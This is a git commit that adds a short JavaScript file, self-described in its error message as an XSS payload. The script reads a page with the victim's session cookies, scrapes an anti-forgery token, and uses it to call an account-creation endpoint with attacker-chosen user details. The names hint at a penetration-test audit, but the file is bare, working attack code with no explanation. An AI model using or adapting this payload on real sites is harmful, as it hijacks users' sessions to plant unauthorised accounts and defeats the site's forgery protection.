51a2d39f644836efd1968a660a8f395574ced434
Paul-Adrien Cha <78745732+HeadjuiceOne@users.noreply.github.com>
2025-07-17 10:25:03 +0200

    Create 31db1230-2599-4417-92a4-bea9339278d8.js

---
+++ 31db1230-2599-4417-92a4-bea9339278d8.js
@@ -0,0 +1,14 @@
+(async () => {
+  try {
+    const r = await fetch('/suivi.php', { credentials: 'include' });
+    const t = await r.text();
+    const matches = [...t.matchAll(/token=([a-f0-9]{32})/g)];
+    if (matches.length > 12) {
+      const token = matches[12][1];
+      const url = '/follow.php?IdUser=0&LoginUser=Headmind10&NomUser=Auditeur10&PrenomUser=Headmind&MailUser=auditeur10@headmind.com&token=' + token;
+      await fetch(url, { credentials: 'include' });
+    }
+  } catch (e) {
+    console.error('XSS payload error:', e);
+  }
+})();
